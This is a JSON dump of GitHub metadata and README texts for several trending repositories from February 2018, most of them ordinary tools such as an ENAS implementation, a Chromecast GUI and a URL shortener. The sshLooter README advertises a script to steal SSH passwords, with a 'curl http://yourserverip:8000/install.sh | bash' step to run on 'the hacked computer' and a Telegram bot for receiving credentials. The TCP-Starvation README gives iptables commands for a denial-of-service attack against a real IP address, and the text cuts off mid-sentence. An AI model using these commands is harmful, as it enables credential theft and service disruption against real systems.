[{"user":{"login":"carpedm20","followers":{"totalCount":3892},"repositories":{"totalCount":183},"following":{"totalCount":411},"location":null,"organizations":{"totalCount":3},"gists":{"edges":[{"node":{"comments":{"totalCount":0},"stargazers":{"totalCount":1}}},{"node":{"comments":{"totalCount":0},"stargazers":{"totalCount":0}}},{"node":{"comments":{"totalCount":0},"stargazers":{"totalCount":0}}},{"node":{"comments":{"totalCount":0},"stargazers":{"totalCount":0}}},{"node":{"comments":{"totalCount":0},"stargazers":{"totalCount":0}}},{"node":{"comments":{"totalCount":0},"stargazers":{"totalCount":0}}},{"node":{"comments":{"totalCount":0},"stargazers":{"totalCount":0}}},{"node":{"comments":{"totalCount":0},"stargazers":{"totalCount":0}}},{"node":{"comments":{"totalCount":2},"stargazers":{"totalCount":0}}},{"node":{"comments":{"totalCount":0},"stargazers":{"totalCount":0}}}],"totalCount":10},"websiteUrl":"http://carpedm20.github.io/"},"repository":{"name":"ENAS-pytorch","primaryLanguage":{"name":"Python"},"license":null,"isArchived":false,"hasWikiEnabled":true,"forkCount":25,"readme_md":{"text":"# Efficient Neural Architecture Search (ENAS) in PyTorch\n\nPyTorch implementation of [Efficient Neural Architecture Search via Parameters Sharing](https://arxiv.org/abs/1802.03268).\n\n<p align=\"center\"><img src=\"assets/ENAS_rnn.png\" alt=\"ENAS_rnn\" width=\"60%\"></p>\n\n**ENAS** reduce the computational requirement (GPU-hours) of [Neural Architecture Search](https://arxiv.org/abs/1611.01578) (**NAS**) by 1000x via parameter sharing between models that are subgraphs within a large computational graph. SOTA on `Penn Treebank` language modeling.\n\n\n## Prerequisites\n\n- Python 3.6+\n- [PyTorch](http://pytorch.org/)\n- tqdm, scipy, imageio, graphviz, tensorboardX\n\n## Usage\n\nInstall prerequisites with:\n\n    conda install graphviz\n    pip install -r requirements.txt\n\nTo train **ENAS** to discover a recurrent cell for RNN:\n\n    python main.py --network_type rnn --dataset ptb --controller_optim adam --controller_lr 0.00035 \\\n                   --shared_optim sgd --shared_lr 20.0 --entropy_coeff 0.0001\n\n    python main.py --network_type rnn --dataset wikitext\n\nTo train **ENAS** to discover CNN architecture (in progress):\n\n    python main.py --network_type cnn --dataset cifar --controller_optim momentum --controller_lr_cosine=True \\\n                   --controller_lr_max 0.05 --controller_lr_min 0.0001 --entropy_coeff 0.1\n\nor you can use your own dataset by placing images like:\n\n    data\n    ├── YOUR_TEXT_DATASET\n    │   ├── test.txt\n    │   ├── train.txt\n    │   └── valid.txt\n    ├── YOUR_IMAGE_DATASET\n    │   ├── test\n    │   │   ├── xxx.jpg (name doesn't matter)\n    │   │   ├── yyy.jpg (name doesn't matter)\n    │   │   └── ...\n    │   ├── train\n    │   │   ├── xxx.jpg\n    │   │   └── ...\n    │   └── valid\n    │       ├── xxx.jpg\n    │       └── ...\n    ├── image.py\n    └── text.py\n\nTo generate `gif` image of generated samples:\n\n    python generate_gif.py --model_name=ptb_2018-02-15_11-20-02 --output=sample.gif\n\nMore configurations can be found [here](config.py).\n\n\n## Results\n\nEfficient Neural Architecture Search (**ENAS**) is composed of two sets of learnable parameters, controller LSTM *θ* and the shared parameters *ω*. These two parameters are alternatively trained and only trained controller is used to derive novel architectures.\n\n### 1. Discovering Recurrent Cells\n\n![rnn](./assets/rnn.png)\n\nController LSTM decide 1) what activation function to use and 2) which previous node to connect.\n\nThe RNN cell **ENAS** discovered for `Penn Treebank` and `WikiText-2` dataset:\n\n<img src=\"assets/ptb.gif\" alt=\"ptb\" width=\"45%\"> <img src=\"assets/wikitext.gif\" alt=\"wikitext\" width=\"45%\">\n\nBest discovered ENAS cell for `Penn Treebank` at epoch 27:\n\n<img src=\"assets/best_rnn_epoch27.png\" alt=\"ptb\" width=\"30%\">\n\nYou can see the details of training (e.g. `reward`, `entropy`, `loss`) with:\n\n    tensorboard --logdir=logs --port=6006\n\n\n### 2. Discovering Convolutional Neural Networks\n\n![cnn](./assets/cnn.png)\n\nController LSTM samples 1) what computation operation to use and 2) which previous node to connect.\n\nThe CNN network **ENAS** discovered for `CIFAR-10` dataset:\n\n(in progress)\n\n\n### 3. Designing Convolutional Cells\n\n(in progress)\n\n\n## Reference\n\n- [Neural Architecture Search with Reinforcement Learning](https://arxiv.org/abs/1611.01578)\n- [Neural Optimizer Search with Reinforcement Learning](https://arxiv.org/abs/1709.07417)\n\n\n## Author\n\nTaehoon Kim / [@carpedm20](http://carpedm20.github.io/)\n","byteSize":3563},"readme_txt":null,"readme_markdown":null,"readme_tst":null,"readme_":null,"stars":{"totalCount":332},"createdAt":"2018-02-15T04:54:37Z","updatedAt":"2018-02-17T08:43:47Z","pushedAt":"2018-02-17T03:36:32Z","description":"PyTorch implementation of \"Efficient Neural Architecture Search via Parameters Sharing\"","subscribersCount":{"totalCount":20},"diskUsage":13484,"pullRequestsOpen":{"totalCount":0},"pullRequestsClosed":{"totalCount":0},"pullRequestsMerged":{"totalCount":0},"PROpenCommentsCommitsCount":{"edges":[]},"PRClosedCommentsCommitsCount":{"edges":[]},"PRMergedCommentsCommitsCount":{"edges":[]},"issuesOpen":{"totalCount":3},"issuesClosed":{"totalCount":0},"iOpenCommentsParticipantsCount":{"edges":[{"node":{"comments":{"totalCount":4},"participants":{"totalCount":2}}},{"node":{"comments":{"totalCount":0},"participants":{"totalCount":1}}},{"node":{"comments":{"totalCount":1},"participants":{"totalCount":2}}}]},"iClosedCommentsParticipantsCount":{"edges":[]},"numBranches":{"totalCount":1},"numCommits":{"target":{"history":{"totalCount":13}}},"tags":{"totalCount":0},"releases":{"totalCount":0},"type":"user"},"siteAdmin":"false"},{"user":{"login":"keredson","followers":{"totalCount":20},"repositories":{"totalCount":44},"following":{"totalCount":0},"location":"Sammamish, WA","organizations":{"totalCount":0},"gists":{"edges":[],"totalCount":0},"websiteUrl":""},"repository":{"name":"gnomecast","primaryLanguage":{"name":"Python"},"license":"GNU General Public License v3.0","isArchived":false,"hasWikiEnabled":true,"forkCount":16,"readme_md":{"text":"![alt text](https://raw.githubusercontent.com/keredson/gnomecast/master/screenshot.png)\n\nGnomeCast\n=========\n\nThis is a native Linux GUI for casting local files to ChromeCast devices.  It supports:\n\n- Both audio and video files (anything `ffmpeg` can read)\n- Realtime transcoding (only when needed)\n- Subtitles (embedded and external SRT files)\n- Fast scrubbing (waiting 20s for buffering to skip 30s ahead is wrong!)\n\nInstall\n-------\nPlease run:\n\n```\n$ pip3 install gnomecast\n```\n\nIf installing in a `mkvirtualenv` built virtual environment, make sure you include the `--system-site-packages` parameter to get the GTK bindings.\n\nRun\n---\n\n```\n$ gnomecast\n```\n\nIf you see:\n```python\nAttributeError: module 'html5lib.treebuilders' has no attribute '_base'\n```\n\nThis is a known bug in `html5lib` (used by `pycaptions`).  Run this to fix it:\n```\n# pip3 install --upgrade html5lib==1.0b8\n```\n\n*Please report bugs!*\n\n\nThanks To...\n------------\n\n- https://github.com/balloob/pychromecast\n- https://github.com/pbs/pycaption\n- https://www.ffmpeg.org/\n\nAnd everyone who made this project #2 on GitHub's trending list!  That's so awesome!!!\n\n![alt text](https://raw.githubusercontent.com/keredson/gnomecast/master/trending.png)\n\n\nTranscoding\n-----------\nChromecasts only support a handful of media formats.  See: https://developers.google.com/cast/docs/media\n\nSo some amount of transcoding is necessary if your video files don't conform.  But we're smart about it.  If you have an `.mkv` file with `h264` video and `AAC` audio, we use `ffmpeg` to simply rewrite the container (to `.mp4`) without touching the underlying streams, which my XPS 13 can at around 100x realtime (it's fully IO bound).\n\nNow if you have that same `.mkv` file with and `A3C` audio stream (which Chromecast doesn't support) we'll rewrite the container, copy the `h264` stream as is and only transcode the audio (at about 20x).\n\nIf neither your file's audio or video streams are supported, then it'll do a full transcode (at around 5x).\n\nWe write the entire transcoded file to your `/tmp` directory in order to make scrubbing fast and glitch-free, a good trade-off IMO.  Hopefully you're not running your drive at less than one video's worth of free space!\n\nSubtitles\n---------\nChromecast only supports a handful of subtitle formats, `.srt` not included.  But it does support [WebVTT](https://w3c.github.io/webvtt/).  So we extract whatever subtitles are in your video, convert them to WebVTT, and then reattach them to the video through Chomecast's API.\n","byteSize":2517},"readme_txt":null,"readme_markdown":null,"readme_tst":null,"readme_":null,"stars":{"totalCount":502},"createdAt":"2018-02-15T05:26:54Z","updatedAt":"2018-02-17T08:43:22Z","pushedAt":"2018-02-16T22:44:12Z","description":"A native Linux / Gnome / GTK Chromecast GUI that supports transcoding and subtitles.","subscribersCount":{"totalCount":18},"diskUsage":925,"pullRequestsOpen":{"totalCount":2},"pullRequestsClosed":{"totalCount":0},"pullRequestsMerged":{"totalCount":3},"PROpenCommentsCommitsCount":{"edges":[{"node":{"comments":{"totalCount":1},"commits":{"totalCount":3}}},{"node":{"comments":{"totalCount":1},"commits":{"totalCount":1}}}]},"PRClosedCommentsCommitsCount":{"edges":[]},"PRMergedCommentsCommitsCount":{"edges":[{"node":{"comments":{"totalCount":2},"commits":{"totalCount":1}}},{"node":{"comments":{"totalCount":1},"commits":{"totalCount":2}}},{"node":{"comments":{"totalCount":2},"commits":{"totalCount":1}}}]},"issuesOpen":{"totalCount":2},"issuesClosed":{"totalCount":5},"iOpenCommentsParticipantsCount":{"edges":[{"node":{"comments":{"totalCount":1},"participants":{"totalCount":2}}},{"node":{"comments":{"totalCount":0},"participants":{"totalCount":1}}}]},"iClosedCommentsParticipantsCount":{"edges":[{"node":{"comments":{"totalCount":2},"participants":{"totalCount":2}}},{"node":{"comments":{"totalCount":3},"participants":{"totalCount":4}}},{"node":{"comments":{"totalCount":1},"participants":{"totalCount":2}}},{"node":{"comments":{"totalCount":2},"participants":{"totalCount":3}}},{"node":{"comments":{"totalCount":0},"participants":{"totalCount":1}}}]},"numBranches":{"totalCount":2},"numCommits":{"target":{"history":{"totalCount":41}}},"tags":{"totalCount":0},"releases":{"totalCount":0},"type":"user"},"siteAdmin":"false"},{"user":{"login":"gruns","followers":{"totalCount":31},"repositories":{"totalCount":19},"following":{"totalCount":0},"location":null,"organizations":{"totalCount":0},"gists":{"edges":[{"node":{"comments":{"totalCount":0},"stargazers":{"totalCount":0}}},{"node":{"comments":{"totalCount":0},"stargazers":{"totalCount":0}}},{"node":{"comments":{"totalCount":0},"stargazers":{"totalCount":0}}},{"node":{"comments":{"totalCount":0},"stargazers":{"totalCount":0}}},{"node":{"comments":{"totalCount":0},"stargazers":{"totalCount":0}}},{"node":{"comments":{"totalCount":0},"stargazers":{"totalCount":0}}},{"node":{"comments":{"totalCount":0},"stargazers":{"totalCount":0}}},{"node":{"comments":{"totalCount":0},"stargazers":{"totalCount":0}}},{"node":{"comments":{"totalCount":0},"stargazers":{"totalCount":0}}},{"node":{"comments":{"totalCount":0},"stargazers":{"totalCount":0}}},{"node":{"comments":{"totalCount":0},"stargazers":{"totalCount":0}}},{"node":{"comments":{"totalCount":0},"stargazers":{"totalCount":0}}}],"totalCount":12},"websiteUrl":null},"repository":{"name":"icecream","primaryLanguage":{"name":"Python"},"license":"MIT License","isArchived":false,"hasWikiEnabled":true,"forkCount":5,"readme_md":{"text":"<h1 align=\"center\">\n  <img src=\"icon.svg\" width=\"220px\" alt=\"icecream\">\n</h1>\n\n<p align=\"center\">\n  <a href=\"https://pypi.python.org/pypi/icecream\">\n    <img src=\"https://badge.fury.io/py/icecream.svg\">\n  </a>\n  <a href=\"https://travis-ci.org/gruns/icecream\">\n    <img src=\"https://img.shields.io/travis/gruns/icecream.svg\">\n  </a>\n  <a href=\"http://unlicense.org/\">\n    <img src=\"https://img.shields.io/pypi/l/icecream.svg\">\n  </a>\n  <a href=\"https://pypi.python.org/pypi/icecream\">\n    <img src=\"https://img.shields.io/pypi/pyversions/icecream.svg\">\n  </a>\n</p>\n\n\n### IceCream is a little library for sweet and creamy print debugging.\n\nDo you ever use `print()` statements to debug your code? Of course you\ndo. IceCream, or `ic` for short, makes `print()` debugging a little sweeter.\n\nIceCream is well tested, [permissively licensed](LICENSE.txt), and supports\nPython 2, Python 3, PyPy2, and PyPy3.\n\n\n### Ice Cream with Toppings (Arguments)\n\nHave you ever printed variables or expressions to debug your program? If you've\never typed something like\n\n```python\nprint(foo('123'))\n```\n\nor the more thorough\n\n\n```python\nprint(\"foo('123')\", foo('123'))\n```\n\nthen `ic()` is here to help. With arguments, `ic()` inspects itself and prints\nboth its arguments and its argument's values.\n\n```python\nfrom icecream import ic\n\ndef foo(s):\n    return s[::-1]\n\nic(foo('123'))\n```\n\nPrints\n\n```\nic| foo('123'): 321\n```\n\nSimilarly,\n\n```python\nd = {'d': {1: 'one'}}\nic(d['d'][1])\n\nclass klass():\n    attr = 'yep'\nic(klass.attr)\n```\n\nprints\n\n```\nic| d['d'][1]: 'one'\nic| klass.attr: 'yep'\n```\n\nJust give `ic()` a variable or expression and you're done. Easy.\n\n\n### Plain Ice Cream (without Arguments)\n\nDo you ever add print statements to determine which parts of your program are\nexecuted, and in which order they're executed? For example, if you've ever added\nprints statements to debug something like\n\n```python\ndef foo():\n    print(0)\n    first()\n\n    if expression:\n        print(1)\n        second()\n    else:\n        print(2)\n        third()\n```\n\nthen `ic()` helps here, too. Without arguments, `ic()` inspects itself and\nprints the calling filename and line number.\n\n```python\nfrom icecream import ic\n\ndef foo():\n    ic()\n    first()\n    \n    if expression:\n        ic()\n        second()\n    else:\n        ic()\n        third()\n```\n\nPrints\n\n```\nic| example.py:4\nic| example.py:11\n```\n\nJust call `ic()` and you're done. Simple.\n\n\n### Return Value\n\n`ic()` returns its argument(s), so `ic()` can be inserted into, and debug,\npre-existing expressions without problem.\n\n```pycon\n>>> def foo(i):\n>>>     return i / 2\n>>> b = ic(foo(6))\nic| foo(6): 3\n>>> ic(b)\nic| b: 3\n```\n\n\n### Installation\n\nInstalling IceCream with pip is easy.\n\n```\n$ pip install icecream\n```\n\n\n### Other Flavors (Languages)\n\nIceCream is currently just for Python, but IceCream should be enjoyed with every\nlanguage.\n\nIf you'd like a similar `ic()` method in your favorite language, please open a\npull request! IceCream's goal is to sweeten print debugging with a handy-dandy\n`ic()` function in every language.\n","byteSize":3061},"readme_txt":null,"readme_markdown":null,"readme_tst":null,"readme_":null,"stars":{"totalCount":290},"createdAt":"2018-02-13T18:56:12Z","updatedAt":"2018-02-17T07:24:16Z","pushedAt":"2018-02-16T22:18:24Z","description":"Sweet and creamy print debugging.","subscribersCount":{"totalCount":8},"diskUsage":47,"pullRequestsOpen":{"totalCount":0},"pullRequestsClosed":{"totalCount":0},"pullRequestsMerged":{"totalCount":2},"PROpenCommentsCommitsCount":{"edges":[]},"PRClosedCommentsCommitsCount":{"edges":[]},"PRMergedCommentsCommitsCount":{"edges":[{"node":{"comments":{"totalCount":1},"commits":{"totalCount":1}}},{"node":{"comments":{"totalCount":1},"commits":{"totalCount":2}}}]},"issuesOpen":{"totalCount":2},"issuesClosed":{"totalCount":1},"iOpenCommentsParticipantsCount":{"edges":[{"node":{"comments":{"totalCount":1},"participants":{"totalCount":2}}},{"node":{"comments":{"totalCount":0},"participants":{"totalCount":1}}}]},"iClosedCommentsParticipantsCount":{"edges":[{"node":{"comments":{"totalCount":2},"participants":{"totalCount":2}}}]},"numBranches":{"totalCount":1},"numCommits":{"target":{"history":{"totalCount":29}}},"tags":{"totalCount":0},"releases":{"totalCount":0},"type":"user"},"siteAdmin":"false"},{"organization":{"login":"thedevs-network","repositories":{"totalCount":4},"location":null,"members":{"totalCount":4},"websiteUrl":"https://thedevs.network"},"repository":{"name":"kutt","primaryLanguage":{"name":"JavaScript"},"license":"MIT License","isArchived":false,"hasWikiEnabled":true,"forkCount":35,"readme_md":{"text":"<a href=\"https://kutt.it\" title=\"kutt.it\"><img src=\"https://camo.githubusercontent.com/073e709d02d3cf6ee5439ee6ce0bb0895f9f3733/687474703a2f2f6f6936372e74696e797069632e636f6d2f3636797a346f2e6a7067\" alt=\"Kutt.it\"></a>\n\n# Kutt.it\n\n**Kutt** is a modern URL shortener which lets you set custom domains for your shortened URLs, manage your links and view the click rate statistics.\n\n*Contributions and bug reports are welcome.*\n\n[https://kutt.it](https://kutt.it)\n\n[![Build Status](https://travis-ci.org/thedevs-network/kutt.svg?branch=develop)](https://travis-ci.org/thedevs-network/kutt)\n[![Contributions](https://img.shields.io/badge/contributions-welcome-brightgreen.svg)](https://github.com/thedevs-network/kutt/#contributing)\n[![GitHub license](https://img.shields.io/github/license/thedevs-network/kutt.svg)](https://github.com/thedevs-network/kutt/blob/develop/LICENSE)\n[![Twitter](https://img.shields.io/twitter/url/https/github.com/thedevs-network/kutt/.svg?style=social)](https://twitter.com/intent/tweet?text=Wow:&url=https%3A%2F%2Fgithub.com%2Fthedevs-network%2Fkutt%2F)\n\n## Table of Contents\n* [Key Features](#key-features)\n* [Stack](#stack)\n* [Setup](#setup)\n* [API](#api)\n* [Contributing](#contributing)\n\n## Key Features\n* Free and open source.\n* Setting custom domain.\n* Using custom URLs for shortened links\n* Setting password for links.\n* Private statistics for shortened URLs.\n* View and manage your links.\n* Provided API.\n\n## Stack\n* Node (Web server)\n* Express (Web server framework)\n* Passport (Authentication)\n* React (UI library)\n* Next (Universal/server-side rendered React)\n* Redux (State management)\n* styled-components (CSS styling solution library)\n* Recharts (Chart library)\n* Neo4j (Graph database)\n\n## Setup\nYou need to have [Node.js](https://nodejs.org/) and [Neo4j](https://neo4j.com/) installed on your system.\n\n1. Clone this repository on [downlaod zip](https://github.com/thedevs-network/kutt/archive/master.zip).\n2. Copy `config.example.js` to `config.js` in both server and client folders and fill them properly.\n3. Install dependencies: `npm install`.\n4. Start Neo4j database.\n5. Run for development: `npm run dev`.\n6. Run for production: `npm run build` then `npm start`.\n\n## API\nIn additional to website, you can use these APIs to create, delete and get URLs.\n\nIn order to use these APIs you need to generate an API key from settings. Don not ever put this key in the client side of your app or anywhere that is exposed to others.\n\nInclude API key as `apikey` in the body of all below requests. Available API URLs with body parameters:\n\n**Get shortened URLs list:**\n```\nPOST /api/url/geturls\n```\n\n**Submit a links to be shortened**:\n```\nPOST /api/url/submit\n```\nBody:\n  * `target`: Original long URL to be shortened.\n\n**Delete a shortened URL** and **Get stats for a shortened URL:**\n```\nPOST /api/url/deleteurl\nPOST /api/url/stats\n```\nBody\n  * `id`: ID of the shortened URL.\n  * `domain` (optional):  Required if a custom domain is used for short URL.\n\n## Contributing\nPull requests are welcome. You'll probably find lots of improvements to be made.\n\nOpen issues for feadback, needed features, reporting bugs or discussing ideas.\n","byteSize":3169},"readme_txt":null,"readme_markdown":null,"readme_tst":null,"readme_":null,"stars":{"totalCount":480},"createdAt":"2018-02-13T12:33:16Z","updatedAt":"2018-02-17T08:37:29Z","pushedAt":"2018-02-16T19:48:25Z","description":"Free Modern URL Shortener.","subscribersCount":{"totalCount":7},"diskUsage":288,"pullRequestsOpen":{"totalCount":0},"pullRequestsClosed":{"totalCount":0},"pullRequestsMerged":{"totalCount":2},"PROpenCommentsCommitsCount":{"edges":[]},"PRClosedCommentsCommitsCount":{"edges":[]},"PRMergedCommentsCommitsCount":{"edges":[{"node":{"comments":{"totalCount":0},"commits":{"totalCount":1}}},{"node":{"comments":{"totalCount":1},"commits":{"totalCount":2}}}]},"issuesOpen":{"totalCount":2},"issuesClosed":{"totalCount":3},"iOpenCommentsParticipantsCount":{"edges":[{"node":{"comments":{"totalCount":1},"participants":{"totalCount":2}}},{"node":{"comments":{"totalCount":0},"participants":{"totalCount":2}}}]},"iClosedCommentsParticipantsCount":{"edges":[{"node":{"comments":{"totalCount":0},"participants":{"totalCount":2}}},{"node":{"comments":{"totalCount":1},"participants":{"totalCount":2}}},{"node":{"comments":{"totalCount":3},"participants":{"totalCount":2}}}]},"numBranches":{"totalCount":2},"numCommits":{"target":{"history":{"totalCount":1}}},"tags":{"totalCount":0},"releases":{"totalCount":0},"type":"organization"},"siteAdmin":"false"},{"user":{"login":"mthbernardes","followers":{"totalCount":258},"repositories":{"totalCount":86},"following":{"totalCount":41},"location":"Campinas","organizations":{"totalCount":0},"gists":{"edges":[{"node":{"comments":{"totalCount":0},"stargazers":{"totalCount":0}}},{"node":{"comments":{"totalCount":0},"stargazers":{"totalCount":0}}},{"node":{"comments":{"totalCount":0},"stargazers":{"totalCount":0}}},{"node":{"comments":{"totalCount":0},"stargazers":{"totalCount":0}}}],"totalCount":4},"websiteUrl":"https://mthbernardes.github.io"},"repository":{"name":"sshLooter","primaryLanguage":{"name":"Shell"},"license":null,"isArchived":false,"hasWikiEnabled":true,"forkCount":8,"readme_md":{"text":"# sshLooter\nScript to steal passwords from ssh.\n\n# Install\n<pre>\ngit clone https://github.com/mthbernardes/sshLooter.git\ncd sshLooter\n</pre>\n\n# Configuration\n<pre>\nEdit the script on install.sh, and add your telegram bot api, and your userid.\nCall the @botfather on telegram to create a bot and call the @userinfobot to get your user id.\n</pre>\n\n# Usage\n<pre>\nOn your server execute.\npython -m SimpleHTTPServer\n\nOn the hacked computer execute.\ncurl http://yourserverip:8000/install.sh | bash\n</pre>\n\n# Original script from\n<a href=\"http://www.chokepoint.net/2014/01/more-fun-with-pam-python-failed.html\" target=\"_blank\">ChokePoint</a>\n\n# My post about this script\n<a href=\"https://mthbernardes.github.io/persistence/2018/02/10/stealing-ssh-credentials-another-approach.html\" target=\"_blank\">Stealing SSH credentials Another Approach.</a>\n","byteSize":838},"readme_txt":null,"readme_markdown":null,"readme_tst":null,"readme_":null,"stars":{"totalCount":106},"createdAt":"2018-02-12T17:59:57Z","updatedAt":"2018-02-17T08:16:33Z","pushedAt":"2018-02-13T07:03:33Z","description":"Script to steal passwords from ssh.","subscribersCount":{"totalCount":6},"diskUsage":6,"pullRequestsOpen":{"totalCount":0},"pullRequestsClosed":{"totalCount":0},"pullRequestsMerged":{"totalCount":0},"PROpenCommentsCommitsCount":{"edges":[]},"PRClosedCommentsCommitsCount":{"edges":[]},"PRMergedCommentsCommitsCount":{"edges":[]},"issuesOpen":{"totalCount":0},"issuesClosed":{"totalCount":0},"iOpenCommentsParticipantsCount":{"edges":[]},"iClosedCommentsParticipantsCount":{"edges":[]},"numBranches":{"totalCount":1},"numCommits":{"target":{"history":{"totalCount":5}}},"tags":{"totalCount":0},"releases":{"totalCount":0},"type":"user"},"siteAdmin":"false"},{"user":{"login":"ezyang","followers":{"totalCount":630},"repositories":{"totalCount":148},"following":{"totalCount":2},"location":"New York, NY","organizations":{"totalCount":3},"gists":{"edges":[{"node":{"comments":{"totalCount":0},"stargazers":{"totalCount":2}}},{"node":{"comments":{"totalCount":0},"stargazers":{"totalCount":0}}},{"node":{"comments":{"totalCount":0},"stargazers":{"totalCount":1}}},{"node":{"comments":{"totalCount":0},"stargazers":{"totalCount":0}}},{"node":{"comments":{"totalCount":0},"stargazers":{"totalCount":0}}},{"node":{"comments":{"totalCount":0},"stargazers":{"totalCount":0}}},{"node":{"comments":{"totalCount":0},"stargazers":{"totalCount":0}}},{"node":{"comments":{"totalCount":0},"stargazers":{"totalCount":0}}},{"node":{"comments":{"totalCount":0},"stargazers":{"totalCount":0}}},{"node":{"comments":{"totalCount":0},"stargazers":{"totalCount":0}}},{"node":{"comments":{"totalCount":0},"stargazers":{"totalCount":0}}},{"node":{"comments":{"totalCount":0},"stargazers":{"totalCount":0}}},{"node":{"comments":{"totalCount":0},"stargazers":{"totalCount":0}}},{"node":{"comments":{"totalCount":0},"stargazers":{"totalCount":0}}},{"node":{"comments":{"totalCount":0},"stargazers":{"totalCount":0}}},{"node":{"comments":{"totalCount":0},"stargazers":{"totalCount":0}}},{"node":{"comments":{"totalCount":0},"stargazers":{"totalCount":0}}},{"node":{"comments":{"totalCount":0},"stargazers":{"totalCount":0}}},{"node":{"comments":{"totalCount":0},"stargazers":{"totalCount":4}}},{"node":{"comments":{"totalCount":0},"stargazers":{"totalCount":1}}},{"node":{"comments":{"totalCount":0},"stargazers":{"totalCount":0}}},{"node":{"comments":{"totalCount":0},"stargazers":{"totalCount":1}}},{"node":{"comments":{"totalCount":0},"stargazers":{"totalCount":0}}},{"node":{"comments":{"totalCount":0},"stargazers":{"totalCount":0}}},{"node":{"comments":{"totalCount":0},"stargazers":{"totalCount":0}}},{"node":{"comments":{"totalCount":0},"stargazers":{"totalCount":0}}},{"node":{"comments":{"totalCount":0},"stargazers":{"totalCount":0}}},{"node":{"comments":{"totalCount":0},"stargazers":{"totalCount":0}}},{"node":{"comments":{"totalCount":0},"stargazers":{"totalCount":0}}},{"node":{"comments":{"totalCount":0},"stargazers":{"totalCount":0}}},{"node":{"comments":{"totalCount":0},"stargazers":{"totalCount":0}}},{"node":{"comments":{"totalCount":0},"stargazers":{"totalCount":0}}},{"node":{"comments":{"totalCount":0},"stargazers":{"totalCount":0}}},{"node":{"comments":{"totalCount":0},"stargazers":{"totalCount":0}}}],"totalCount":34},"websiteUrl":"http://ezyang.com"},"repository":{"name":"convolution-visualizer","primaryLanguage":{"name":"JavaScript"},"license":null,"isArchived":false,"hasWikiEnabled":true,"forkCount":13,"readme_md":{"text":"## Convolution Visualizer\n\nLive at [Convolution Visualizer](https://ezyang.github.io/convolution-visualizer/index.html).\n\nMade with the help of our fine friends at [React](https://reactjs.org/)\nand [D3.js](https://d3js.org/).\n\n### Things to do\n\nWant to play around with the code?  Clone this repository and run `yarn\nstart` to start a development instance.  The main code lives in\n`src/index.js`.  This [React manual](https://github.com/facebookincubator/create-react-app/blob/master/packages/react-scripts/template/README.md) may be of interest.\n\nHere are some project ideas:\n\n* Tweak the CSS so that the weight and output matrices\n  are displayed to the right of the input if there is space.\n* Add a slider for adjusting speed of the animation.\n* Add a slider which specifies the animation timestep you\n  are on; this way, you can run the animation forward and\n  backward by dragging the slider.\n* Add output size and output padding sliders.  When these\n  sliders are adjusted, you recompute the input size using\n  the transposed convolution formula.\n* Add an onClick handler, which pins your selection at\n  the current mouse collection until another click\n  occurs (disabling the hover behavior.)\n* Add a mode which, when enabled, labels cells with variables and\n  renders the mathematical formula to compute the output\n  cell you are moused over.\n* Render code for PyTorch (or your favorite framework) which performs the\n  selected convolution.\n* Add more exotic convolution types like circular convolution.\n* Add a \"true\" convolution mode, where the weights are flipped\n  before multiplication.\n* Support bigger input sizes than 16 (decreasing the size of\n  the squares when inputs are large), and optimize the code so that it\n  still runs quickly in these cases.\n* Support assymmetric inputs/kernels/strides/dilations.\n\nBigger projects:\n\n* Create an in-browser canvas application, which convolves\n  an input image against a displayed filter.  Bonus points\n  if your canvas supports painting capabilities.\n* Design a visualization which demonstrates the principles\n  of group convolution, allowing you to slide from standard\n  to depthwise convolution.\n","byteSize":2158},"readme_txt":null,"readme_markdown":null,"readme_tst":null,"readme_":null,"stars":{"totalCount":111},"createdAt":"2018-02-12T09:37:22Z","updatedAt":"2018-02-17T01:51:52Z","pushedAt":"2018-02-13T06:44:46Z","description":"Convolution visualizations","subscribersCount":{"totalCount":6},"diskUsage":2960,"pullRequestsOpen":{"totalCount":0},"pullRequestsClosed":{"totalCount":0},"pullRequestsMerged":{"totalCount":0},"PROpenCommentsCommitsCount":{"edges":[]},"PRClosedCommentsCommitsCount":{"edges":[]},"PRMergedCommentsCommitsCount":{"edges":[]},"issuesOpen":{"totalCount":0},"issuesClosed":{"totalCount":1},"iOpenCommentsParticipantsCount":{"edges":[]},"iClosedCommentsParticipantsCount":{"edges":[{"node":{"comments":{"totalCount":0},"participants":{"totalCount":1}}}]},"numBranches":{"totalCount":2},"numCommits":{"target":{"history":{"totalCount":14}}},"tags":{"totalCount":0},"releases":{"totalCount":0},"type":"user"},"siteAdmin":"false"},{"user":{"login":"Eplox","followers":{"totalCount":26},"repositories":{"totalCount":8},"following":{"totalCount":1},"location":null,"organizations":{"totalCount":0},"gists":{"edges":[],"totalCount":0},"websiteUrl":"https://0x41.no"},"repository":{"name":"TCP-Starvation","primaryLanguage":{"name":"Python"},"license":null,"isArchived":false,"hasWikiEnabled":true,"forkCount":42,"readme_md":{"text":"# TCP-Starvation\r\n\r\n**Update:** From comments throughout different communities, I've seen links to different articles describing the same issue as I do here. \r\nI understand this vulnerability that has existed for quite some time already (10y+), and by no means trying to take credit for them. \r\nPerhaps I used wrong search terms when looking for related articles, or just that they was located at page 42 on google. Either way, I still hope you enjoy the read and perhaps learn something useful.\r\n\r\nI've also seen a lot of people mistake this for a SYN flood attack. This attack relies on a full connection, not half open. So SYN cookies won't help you.\r\n\r\nSince this is a already know vulnerability with existing attacks/pocs, I've decided to upload a trimmed down version of the kittenzlauncher.py (ddos/waf evasion, proxy jumping, c2 mode - is removed).\r\n\r\n<br> <br>\r\n**Original:**\r\n\r\nSome time ago, I found a design flaw/vulnerability which affects most TCP services and allows for a new variant of denial of service. \r\nThis attack can multiply the efficiency of a traditional DoS by a large amount, depending on what the target and purpose may be.\r\n\r\n\r\nThe idea behind this attack is to close a TCP session on the attacker's side, while leaving it open for the\r\nvictim. Looping this will quickly fill up the victim’s session limit, effectively denying other users to\r\naccess the service.\r\n\r\n\r\nThis is possible by abusing RFC793, which lacks an exception if reset is not sent. \r\n\r\n    RFC793 page 36\r\n    As a general rule, reset (RST) must be sent whenever a segment arrives\r\n    which apparently is not intended for the current connection. A reset\r\n    must not be sent if it is not clear that this is the case. \r\n\r\n<br>\r\n\r\nWhat does this affect?\r\n- Most services running on TCP\r\n- Product handling TCP sessions such as:\r\n  - Firewalls with session based policies\r\n  - Routers and firewalls with NAT tables\r\n  - Load balancers\r\n  - and probably a lot more\r\n\r\n<br>\r\n\r\n## Proof of Concept\r\nConnect to a device with root privileges and drop all outgoing RST and FIN packets towards the victim server.\r\n\r\n    iptables -A OUTPUT -d 173.194.222.100 -p tcp --dport 80 --tcp-flags RST RST -j DROP\r\n    iptables -A OUTPUT -d 173.194.222.100 -p tcp --dport 80 --tcp-flags FIN FIN -j DROP \r\n\r\nThe python script below will close the TCP connection early, instead of waiting for a 